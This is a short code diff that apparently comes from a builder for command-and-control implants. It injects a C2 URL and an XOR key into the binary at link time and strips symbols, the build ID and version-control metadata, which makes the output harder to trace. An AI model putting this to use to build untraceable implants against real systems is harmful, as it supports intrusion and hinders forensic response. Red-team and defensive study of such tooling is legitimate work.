@@ -149,7 +149,7 @@ go 1.25
 		return s
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.XORKey=%s"`,
+	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.XORKey=%s"`,
 		escape(cfg.C2URL),
 		escape(xorKeyHex),
 	)
@@ -187,7 +187,7 @@ go 1.25
 		"-ldflags", ldflags,
 		"-o", outPath,
 		"-trimpath",
-		"-s", "-w", // strip debug symbols for smaller size
+		"-buildvcs=false",
 		".",
 	)
 	cmd.Dir = tmpDir
@@ -304,7 +304,7 @@ go 1.25
 		return s
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.XORKey=%s"`,
+	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.XORKey=%s"`,
 		escape(cfg.C2URL),
 		escape(xorKeyHex),
 	)
@@ -342,7 +342,7 @@ go 1.25
 		"-ldflags", ldflags,
 		"-o", outPath,
 		"-trimpath",
-		"-s", "-w",
+		"-buildvcs=false",
 		".",
 	)
 	cmd.Dir = tmpDir
